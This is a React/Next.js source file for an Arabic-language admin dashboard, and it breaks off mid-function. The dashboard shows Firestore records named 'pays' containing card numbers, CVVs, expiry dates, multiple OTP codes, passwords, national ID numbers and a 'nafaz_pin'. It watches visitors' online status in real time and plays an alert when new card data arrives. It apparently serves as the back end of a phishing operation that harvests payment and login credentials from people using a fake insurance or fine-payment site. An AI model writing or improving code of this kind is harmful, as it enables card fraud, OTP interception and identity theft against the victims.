"use client"

import type React from "react"
import { useState, useEffect, useMemo, useRef, useCallback } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  Search,
  Calendar,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  AlertCircle,
  Loader2,
  BarChartHorizontalBig,
  FileText,
  Palette,
  EyeOff,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
  DialogDescription,
} from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database, auth, db } from "@/lib/firestore" // Assuming these are correctly configured
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu"
import { Sheet, SheetContent, SheetHeader, SheetTitle, SheetDescription, SheetFooter } from "@/components/ui/sheet"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { Switch } from "@/components/ui/switch"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { useToast } from "@/hooks/use-toast"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"

// Flag colors for row highlighting
type FlagColor = "red" | "yellow" | "green" | null

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  // Existing fields
  createdDate: string
  bank?: string
  cardStatus?: string
  ip?: string
  cvv?: string
  id: string | "0"
  expiryDate?: string
  notificationCount?: number
  otp?: string
  otp2?: string
  page?: string
  cardNumber?: string
  country?: string
  personalInfo?: {
    id?: string | "0"
    name?: string
    phone?: string
  }
  prefix?: string
  status?: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen?: string | { sv: "timestamp" }
  violationValue?: number
  pass?: string
  cardCvc?: string
  year?: string
  month?: string
  pagename?: string
  plateType?: string
  allOtps?: string[] | null
  idNumber?: string
  email?: string
  mobile?: string
  network?: string
  phoneOtp?: string
  cardExpiry?: string
  name?: string
  otpCode?: string
  phone?: string
  flagColor?: any
  isHidden?: boolean

  // New fields from dataset
  additionalDrivers?: number
  agreeToTerms?: boolean
  buyer_identity_number?: string
  cardMonth?: string
  cardName?: string
  cardYear?: string
  documment_owner_full_name?: string
  insuranceTypeSelected?: string
  insurance_purpose?: string
  online?: boolean
  operator?: string
  otpSent?: boolean
  owner_identity_number?: string
  paymentStatus?: string
  phone2?: string
  policyStartDate?: string
  selectedAddons?: any[]
  selectedInsuranceOffer?: string
  seller_identity_number?: string
  sequenceNumber?: string
  specialDiscounts?: boolean
  timestamp?: string
  vehicle_type?: string
  nafaz_pin?: string // Added field
}


function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)
    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown") // Or 'offline' if unknown implies offline
      }
    })
    return () => unsubscribe()
  }, [userId])

  return (
    <Badge
      variant={status === "online" ? "default" : "outline"}
      className={`
    ${
      status === "online"
        ? "bg-gradient-to-r from-emerald-500 to-emerald-600 border-emerald-500 text-white shadow-lg shadow-emerald-500/25"
        : status === "offline"
          ? "bg-gradient-to-r from-gray-100 to-gray-200 border-gray-300 text-gray-700 dark:from-gray-700 dark:to-gray-800 dark:border-gray-600 dark:text-gray-300"
          : "bg-gradient-to-r from-amber-100 to-amber-200 border-amber-300 text-amber-700 dark:from-amber-700 dark:to-amber-800 dark:border-amber-600 dark:text-amber-300"
    } text-xs px-2 py-0.5 transition-all duration-200
  `}
    >
      <span
        className={`mr-1.5 inline-block h-2 w-2 rounded-full ${
          status === "online"
            ? "bg-white animate-pulse"
            : status === "offline"
              ? "bg-gray-400"
              : "bg-amber-400 animate-pulse"
        }`}
      ></span>
      {status === "online" ? "متصل" : status === "offline" ? "غير متصل" : "غير معروف"}
    </Badge>
  )
}

function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  const colors: { name: FlagColor; label: string; iconColor: string; bgColor: string; hoverBgColor: string }[] = [
    {
      name: "red",
      label: "علم أحمر",
      iconColor: "text-red-500 fill-red-500",
      bgColor: "bg-red-100 dark:bg-red-900",
      hoverBgColor: "hover:bg-red-200 dark:hover:bg-red-800",
    },
    {
      name: "yellow",
      label: "علم أصفر",
      iconColor: "text-yellow-500 fill-yellow-500",
      bgColor: "bg-yellow-100 dark:bg-yellow-900",
      hoverBgColor: "hover:bg-yellow-200 dark:hover:bg-yellow-800",
    },
    {
      name: "green",
      label: "علم أخضر",
      iconColor: "text-green-500 fill-green-500",
      bgColor: "bg-green-100 dark:bg-green-900",
      hoverBgColor: "hover:bg-green-200 dark:hover:bg-green-800",
    },
  ]

  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8 data-[state=open]:bg-muted">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
          <span className="sr-only">تغيير العلم</span>
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-1">
        <div className="flex gap-1">
          {colors.map((color) => (
            <TooltipProvider key={color.name}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full ${color.bgColor} ${color.hoverBgColor}`}
                    onClick={() => onColorChange(notificationId, color.name)}
                  >
                    <Flag className={`h-4 w-4 ${color.iconColor}`} />
                    <span className="sr-only">{color.label}</span>
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{color.label}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-100 dark:bg-gray-800 hover:bg-gray-200 dark:hover:bg-gray-700"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <XCircle className="h-4 w-4 text-muted-foreground" />
                    <span className="sr-only">إزالة العلم</span>
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

function MiniChart({ data, colorClassName }: { data: number[]; colorClassName: string }) {
  if (!data || data.length === 0) {
    return (
      <div className="h-10 w-full flex items-center justify-center text-xs text-muted-foreground">لا توجد بيانات</div>
    )
  }
  const maxVal = Math.max(...data, 1) // Avoid division by zero if all values are 0

  return (
    <div className="flex h-10 items-end gap-0.5 w-full">
      {data.map((value, index) => {
        const heightPercentage = (value / maxVal) * 100
        return (
          <div
            key={index}
            className={`w-1.5 rounded-t-sm ${colorClassName} transition-all duration-300 ease-in-out`}
            style={{ height: `${Math.max(5, heightPercentage)}%` }} // min height 5%
          ></div>
        )
      })}
    </div>
  )
}

function ActivityTimeline({ notifications }: { notifications: Notification[] }) {
  const recentActivities = notifications.slice(0, 5)

  if (recentActivities.length === 0) {
    return (
      <div className="flex flex-col items-center justify-center py-10 text-center text-muted-foreground">
        <Clock className="h-10 w-10 mb-3 text-gray-400 dark:text-gray-600" />
        <p className="text-sm">لا توجد أنشطة حديثة لعرضها.</p>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      {recentActivities.map((notification, index) => (
        <div key={notification.id || index} className="relative flex items-start gap-4">
          {index !== recentActivities.length - 1 && (
            <div className="absolute top-5 left-[11px] h-[calc(100%_-_20px)] w-0.5 bg-border rtl:right-[11px] rtl:left-auto"></div>
          )}
          <div
            className={`z-10 mt-0.5 flex h-6 w-6 flex-shrink-0 items-center justify-center rounded-full ${
              notification.cardNumber
                ? "bg-green-100 text-green-600 dark:bg-green-800 dark:text-green-300"
                : "bg-blue-100 text-blue-600 dark:bg-blue-800 dark:text-blue-300"
            }`}
          >
            {notification.cardNumber ? <CreditCard className="h-3.5 w-3.5" /> : <User className="h-3.5 w-3.5" />}
          </div>
          <div className="flex-grow">
            <div className="flex items-center justify-between">
              <p className="text-sm font-medium text-foreground">
                {notification.cardNumber ? "معلومات بطاقة جديدة" : "معلومات شخصية جديدة"}
              </p>
              <p className="text-xs text-muted-foreground">
                {notification.createdDate &&
                  formatDistanceToNow(new Date(notification.createdDate), {
                    addSuffix: true,
                    locale: ar,
                  })}
              </p>
            </div>
            <p className="mt-0.5 text-xs text-muted-foreground">
              {notification.country || "غير معروف"} -{" "}
              {notification.name || notification.phone || notification.email || "مستخدم جديد"}
            </p>
            <div className="mt-2 flex flex-wrap gap-1.5">
              {notification.cardNumber && (
                <Badge variant="outline" className="text-xs">
                  بطاقة
                </Badge>
              )}
              {(notification.otp || notification.otpCode) && (
                <Badge variant="outline" className="text-xs">
                  OTP: {notification.otp || notification.otpCode}
                </Badge>
              )}
              <UserStatus userId={notification.id} />
            </div>
          </div>
        </div>
      ))}
    </div>
  )
}

function SearchBar({ onSearch, initialTerm = "" }: { onSearch: (term: string) => void; initialTerm?: string }) {
  const [searchTerm, setSearchTerm] = useState(initialTerm)
  const searchInputRef = useRef<HTMLInputElement>(null)

  const handleSearch = () => {
    onSearch(searchTerm)
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch()
    }
  }

  useEffect(() => {
    setSearchTerm(initialTerm)
  }, [initialTerm])

  return (
    <div className="relative">
      <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground rtl:right-3 rtl:left-auto" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="بحث بالإسم, الإيميل, البطاقة..."
        className="w-full rounded-md bg-background pl-10 pr-4 rtl:pr-10 rtl:pl-4 h-10"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
        onKeyDown={handleKeyDown}
        onBlur={handleSearch} // Optional: search on blur
      />
    </div>
  )
}

function Pagination({
  currentPage,
  totalPages,
  onPageChange,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
}) {
  const pageNumbers = []
  const maxPagesToShow = 5
  let startPage, endPage

  if (totalPages <= maxPagesToShow) {
    startPage = 1
    endPage = totalPages
  } else {
    if (currentPage <= Math.ceil(maxPagesToShow / 2)) {
      startPage = 1
      endPage = maxPagesToShow
    } else if (currentPage + Math.floor(maxPagesToShow / 2) >= totalPages) {
      startPage = totalPages - maxPagesToShow + 1
      endPage = totalPages
    } else {
      startPage = currentPage - Math.floor(maxPagesToShow / 2)
      endPage = currentPage + Math.floor(maxPagesToShow / 2)
    }
  }

  for (let i = startPage; i <= endPage; i++) {
    pageNumbers.push(i)
  }

  return (
    <div className="flex items-center justify-center space-x-1 rtl:space-x-reverse">
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(currentPage - 1)}
        disabled={currentPage <= 1}
        className="h-9 w-9"
      >
        <ChevronRight className="h-4 w-4" />
        <span className="sr-only">الصفحة السابقة</span>
      </Button>
      {startPage > 1 && (
        <>
          <Button variant="outline" size="icon" className="h-9 w-9" onClick={() => onPageChange(1)}>
            1
          </Button>
          {startPage > 2 && <span className="px-2 text-muted-foreground">...</span>}
        </>
      )}
      {pageNumbers.map((page) => (
        <Button
          key={page}
          variant={currentPage === page ? "default" : "outline"}
          size="icon"
          className="h-9 w-9"
          onClick={() => onPageChange(page)}
        >
          {page}
        </Button>
      ))}
      {endPage < totalPages && (
        <>
          {endPage < totalPages - 1 && <span className="px-2 text-muted-foreground">...</span>}
          <Button variant="outline" size="icon" className="h-9 w-9" onClick={() => onPageChange(totalPages)}>
            {totalPages}
          </Button>
        </>
      )}
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(currentPage + 1)}
        disabled={currentPage >= totalPages}
        className="h-9 w-9"
      >
        <ChevronLeft className="h-4 w-4" />
        <span className="sr-only">الصفحة التالية</span>
      </Button>
    </div>
  )
}

function SettingsPanel({
  open,
  onOpenChange,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
}) {
  const { toast } = useToast()
  const [notifyNewCards, setNotifyNewCards] = useState(true)
  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
  const [playSounds, setPlaySounds] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [refreshInterval, setRefreshInterval] = useState("30")
  const [itemsPerPage, setItemsPerPage] = useState("10")
  const [defaultView, setDefaultView] = useState("all")

  const handleSaveSettings = () => {
    // Here you would typically save these settings to localStorage or a backend
    console.log({
      notifyNewCards,
      notifyNewUsers,
      playSounds,
      autoRefresh,
      refreshInterval,
      itemsPerPage,
      defaultView,
    })
    toast({
      title: "تم حفظ الإعدادات",
      description: "تم تحديث تفضيلات الإشعارات والعرض بنجاح.",
      variant: "default",
    })
    onOpenChange(false)
  }

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side="left" className="sm:max-w-md w-[320px] p-0" dir="rtl">
        <SheetHeader className="p-6 pb-4 border-b">
          <SheetTitle className="flex items-center gap-2 text-lg">
            <Settings className="h-5 w-5 text-primary" />
            إعدادات لوحة التحكم
          </SheetTitle>
          <SheetDescription className="text-xs">قم بتخصيص تفضيلات الإشعارات والعرض.</SheetDescription>
        </SheetHeader>
        <div className="p-6 space-y-6 overflow-y-auto h-[calc(100vh_-_140px)]">
          <div className="space-y-4">
            <h3 className="text-sm font-semibold text-foreground">تنبيهات الإشعارات</h3>
            <div className="space-y-3 rounded-md border p-4">
              {[
                {
                  id: "notify-cards",
                  label: "إشعارات البطاقات الجديدة",
                  desc: "تلقي إشعارات عند إضافة بطاقة جديدة",
                  checked: notifyNewCards,
                  setter: setNotifyNewCards,
                },
                {
                  id: "notify-users",
                  label: "إشعارات المستخدمين الجدد",
                  desc: "تلقي إشعارات عند تسجيل مستخدم جديد",
                  checked: notifyNewUsers,
                  setter: setNotifyNewUsers,
                },
                {
                  id: "play-sounds",
                  label: "تشغيل الأصوات",
                  desc: "تشغيل صوت عند استلام إشعار جديد",
                  checked: playSounds,
                  setter: setPlaySounds,
                },
              ].map((item) => (
                <div key={item.id} className="flex items-center justify-between">
                  <div className="space-y-0.5">
                    <Label htmlFor={item.id} className="text-sm">
                      {item.label}
                    </Label>
                    <p className="text-xs text-muted-foreground">{item.desc}</p>
                  </div>
                  <Switch id={item.id} checked={item.checked} onCheckedChange={item.setter} />
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-4">
            <h3 className="text-sm font-semibold text-foreground">التحديث التلقائي</h3>
            <div className="space-y-3 rounded-md border p-4">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-refresh" className="text-sm">
                    تحديث تلقائي للبيانات
                  </Label>
                  <p className="text-xs text-muted-foreground">تحديث قائمة الإشعارات تلقائيًا.</p>
                </div>
                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
              </div>
              {autoRefresh && (
                <div className="space-y-1.5">
                  <Label htmlFor="refresh-interval" className="text-sm">
                    فترة التحديث
                  </Label>
                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                    <SelectTrigger id="refresh-interval">
                      <SelectValue placeholder="اختر فترة" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      {[
                        { value: "10", label: "10 ثواني" },
                        { value: "30", label: "30 ثانية" },
                        { value: "60", label: "دقيقة واحدة" },
                        { value: "300", label: "5 دقائق" },
                      ].map((opt) => (
                        <SelectItem key={opt.value} value={opt.value}>
                          {opt.label}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>

          <div className="space-y-4">
            <h3 className="text-sm font-semibold text-foreground">إعدادات العرض</h3>
            <div className="space-y-3 rounded-md border p-4">
              <div className="space-y-1.5">
                <Label htmlFor="items-per-page" className="text-sm">
                  عدد العناصر في الصفحة
                </Label>
                <Select value={itemsPerPage} onValueChange={setItemsPerPage}>
                  <SelectTrigger id="items-per-page">
                    <SelectValue placeholder="اختر عدد" />
                  </SelectTrigger>
                  <SelectContent position="popper">
                    {[
                      { value: "5", label: "5 عناصر" },
                      { value: "10", label: "10 عناصر" },
                      { value: "20", label: "20 عنصر" },
                      { value: "50", label: "50 عنصر" },
                    ].map((opt) => (
                      <SelectItem key={opt.value} value={opt.value}>
                        {opt.label}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-1.5">
                <Label htmlFor="default-view" className="text-sm">
                  العرض الافتراضي عند التحميل
                </Label>
                <Select value={defaultView} onValueChange={setDefaultView}>
                  <SelectTrigger id="default-view">
                    <SelectValue placeholder="اختر عرض" />
                  </SelectTrigger>
                  <SelectContent position="popper">
                    {[
                      { value: "all", label: "عرض الكل" },
                      { value: "card", label: "البطاقات فقط" },
                      { value: "online", label: "المتصلين فقط" },
                    ].map((opt) => (
                      <SelectItem key={opt.value} value={opt.value}>
                        {opt.label}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>
          </div>
        </div>
        <SheetFooter className="p-6 pt-4 border-t">
          <Button variant="outline" onClick={() => onOpenChange(false)} className="w-full sm:w-auto">
            إلغاء
          </Button>
          <Button onClick={handleSaveSettings} className="w-full sm:w-auto">
            حفظ الإعدادات
          </Button>
        </SheetFooter>
      </SheetContent>
    </Sheet>
  )
}

function ExportDialog({
  open,
  onOpenChange,
  notificationsCount,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  notificationsCount: number
}) {
  const { toast } = useToast()
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    status: true,
    timestamps: true,
  })
  const [isExporting, setIsExporting] = useState(false)

  const handleExport = () => {
    setIsExporting(true)
    // Simulate export process
    setTimeout(() => {
      setIsExporting(false)
      onOpenChange(false)
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${notificationsCount} إشعار بتنسيق ${exportFormat.toUpperCase()}.`,
        variant: "default",
      })
    }, 1500)
  }

  const fieldOptions = [
    { id: "personalInfo", label: "المعلومات الشخصية" },
    { id: "cardInfo", label: "معلومات البطاقة" },
    { id: "status", label: "حالة الإشعار" },
    { id: "timestamps", label: "الطوابع الزمنية" },
  ]

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-lg" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-lg">
            <Download className="h-5 w-5 text-primary" />
            تصدير بيانات الإشعارات
          </DialogTitle>
          <DialogDescription>اختر التنسيق والحقول المراد تصديرها.</DialogDescription>
        </DialogHeader>
        <div className="space-y-6 py-4">
          <div className="space-y-3">
            <Label className="text-sm font-medium">تنسيق الملف</Label>
            <div className="flex gap-4 rounded-md border p-3">
              {["csv", "json"].map((format) => (
                <div key={format} className="flex items-center space-x-2 rtl:space-x-reverse">
                  <input
                    type="radio"
                    id={format}
                    value={format}
                    checked={exportFormat === format}
                    onChange={() => setExportFormat(format as "csv" | "json")}
                    className="h-4 w-4 cursor-pointer text-primary focus:ring-primary border-gray-300"
                  />
                  <Label htmlFor={format} className="cursor-pointer text-sm">
                    {format.toUpperCase()}
                  </Label>
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-3">
            <Label className="text-sm font-medium">الحقول المراد تضمينها</Label>
            <div className="grid grid-cols-2 gap-x-4 gap-y-3 rounded-md border p-3">
              {fieldOptions.map((field) => (
                <div key={field.id} className="flex items-center space-x-2 rtl:space-x-reverse">
                  <Checkbox
                    id={field.id}
                    checked={exportFields[field.id as keyof typeof exportFields]}
                    onCheckedChange={(checked) =>
                      setExportFields((prev) => ({ ...prev, [field.id]: checked as boolean }))
                    }
                  />
                  <Label htmlFor={field.id} className="cursor-pointer text-sm font-normal">
                    {field.label}
                  </Label>
                </div>
              ))}
            </div>
          </div>

          <div className="rounded-md bg-muted/50 p-3 border">
            <div className="flex items-start gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-muted-foreground flex-shrink-0 mt-0.5" />
              <p className="text-muted-foreground">
                سيتم تصدير {notificationsCount} إشعار بالإعدادات المحددة. قد تستغرق العملية بعض الوقت للبيانات الكبيرة.
              </p>
            </div>
          </div>
        </div>
        <DialogFooter className="gap-2 sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)} className="w-full sm:w-auto">
            إلغاء
          </Button>
          <Button
            type="submit"
            onClick={handleExport}
            disabled={isExporting || notificationsCount === 0}
            className="w-full sm:w-auto"
          >
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin rtl:ml-2 rtl:mr-0" /> جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4 rtl:ml-2 rtl:mr-0" /> تصدير ({notificationsCount})
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  const router = useRouter()
  const { toast } = useToast()
  const onlineUsersCount = useOnlineUsersCount()
  const audioRef = useRef<HTMLAudioElement | null>(null)

  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Moved all useMemo and other hooks to the top level
  const filteredNotifications = useMemo(() => {
    return notifications.filter((notification) => {
      if (notification.isHidden) return false

      const matchesFilterType =
        filterType === "all" ||
        (filterType === "card" && !!notification.cardNumber) ||
        (filterType === "online" && onlineStatuses[notification.id])

      if (!matchesFilterType) return false

      if (searchTerm) {
        const term = searchTerm.toLowerCase()
        return (
          notification.name?.toLowerCase().includes(term) ||
          notification.email?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term) ||
          notification.idNumber?.toLowerCase().includes(term)
        )
      }
      return true
    })
  }, [notifications, filterType, onlineStatuses, searchTerm])

  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  const visitorTrend = useMemo(
    () => notifications.slice(0, 20).map((_, i) => Math.floor(Math.random() * (i + 1) * 5) + 5),
    [notifications],
  )
  const cardTrend = useMemo(
    () =>
      notifications
        .slice(0, 20)
        .filter((n) => !!n.cardNumber)
        .map((_, i) => Math.floor(Math.random() * (i + 1) * 2) + 2),
    [notifications],
  )
  const onlineTrend = useMemo(
    () =>
      Object.values(onlineStatuses)
        .slice(0, 20)
        .filter(Boolean)
        .map((_, i) => Math.floor(Math.random() * (i + 1) * 3) + 3),
    [onlineStatuses],
  )

  const statistics = useMemo(
    () => [
      {
        title: "المستخدمين المتصلين",
        value: onlineUsersCount,
        icon: UserCheck,
        color: "blue",
        trend: onlineTrend,
        comparison: `${Math.round((onlineUsersCount / (totalVisitors || 1)) * 100)}%`,
      },
      {
        title: "إجمالي الزوار (المرئي)",
        value: totalVisitors,
        icon: Users,
        color: "green",
        trend: visitorTrend,
        comparison: `+${visitorTrend.length > 1 ? visitorTrend[visitorTrend.length - 1] - visitorTrend[0] : 0}`,
      },
      {
        title: "معلومات البطاقات",
        value: cardSubmissions,
        icon: CreditCard,
        color: "purple",
        trend: cardTrend,
        comparison: `${Math.round((cardSubmissions / (totalVisitors || 1)) * 100)}%`,
      },
    ],
    [onlineUsersCount, totalVisitors, cardSubmissions, onlineTrend, visitorTrend, cardTrend],
  )

  useEffect(() => {
    if (typeof window !== "undefined") {
      audioRef.current = new Audio("/bub.mp3")
    }
  }, [])

  useEffect(() => {
    const unsubscribes: (() => void)[] = []
    notifications.forEach((notification) => {
      if (notification.id === "0") return
      const userStatusRef = ref(database, `/status/${notification.id}`)
      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })
      unsubscribes.push(unsubscribe)
    })
    return () => unsubscribes.forEach((unsub) => unsub())
  }, [notifications])

  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm, itemsPerPage])

  const playNotificationSound = useCallback(() => {
    if (audioRef.current) {
      audioRef.current.play().catch((error) => console.error("Failed to play sound:", error))
    }
  }, []) // audioRef.current is stable

  const updateStatistics = useCallback((activeNotifications: Notification[]) => {
    setTotalVisitors(activeNotifications.length)
    setCardSubmissions(activeNotifications.filter((n) => !!n.cardNumber).length)
  }, []) // setTotalVisitors and setCardSubmissions are stable

  const fetchNotifications = useCallback(() => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        // Important: Get current notifications from a ref or pass to setter if needed for comparison
        // For simplicity here, we'll use the `notifications` state directly in the comparison,
        // which is okay as `fetchNotifications` will be re-memoized if `notifications` changes.
        const currentNotificationsState = notifications

        const notificationsData = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as Notification[]

        const newEntries = notificationsData.filter(
          (newNotif) =>
            !currentNotificationsState.some((oldNotif) => oldNotif.id === newNotif.id) && !newNotif.isHidden,
        )

        if (newEntries.length > 0) {
          const hasNewImportantInfo = newEntries.some((n) => n.cardNumber || n.idNumber || n.email || n.mobile)
          if (hasNewImportantInfo) {
            playNotificationSound()
          }
        }

        updateStatistics(notificationsData.filter((n) => !n.isHidden))
        setNotifications(notificationsData) // This will trigger re-memoization of fetchNotifications if it's a dependency
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        toast({ title: "خطأ في جلب البيانات", description: "لم نتمكن من تحميل الإشعارات.", variant: "destructive" })
        setIsLoading(false)
      },
    )
    return unsubscribe
  }, [db, setIsLoading, setNotifications, playNotificationSound, updateStatistics, notifications, toast]) // Added notifications and toast

  useEffect(() => {
    const unsubscribeAuth = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          if (unsubscribeNotifications) unsubscribeNotifications()
        }
      }
    })
    return () => unsubscribeAuth()
  }, [router, fetchNotifications]) // Added fetchNotifications

  // ... (rest of the component: handleHide, handleClearAllVisible, handleApproval, handleLogout, handleInfoClick, closeDialog, handleFlagColorChange, getRowBackgroundColor)
  // ... (The functions themselves don't need to change for these errors)

  const handleHide = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, isHidden: true } : n)))
      toast({ title: "تم إخفاء الإشعار", description: "لن يظهر هذا الإشعار في القائمة.", variant: "default" })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({ title: "خطأ", description: "حدث خطأ أثناء إخفاء الإشعار.", variant: "destructive" })
    }
  }

  const handleClearAllVisible = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      const visibleNotifications = notifications.filter((n) => !n.isHidden)
      if (visibleNotifications.length === 0) {
        toast({ title: "لا يوجد ما يمكن مسحه", description: "جميع الإشعارات مرئية بالفعل.", variant: "default" })
        setIsLoading(false)
        return
      }
      visibleNotifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
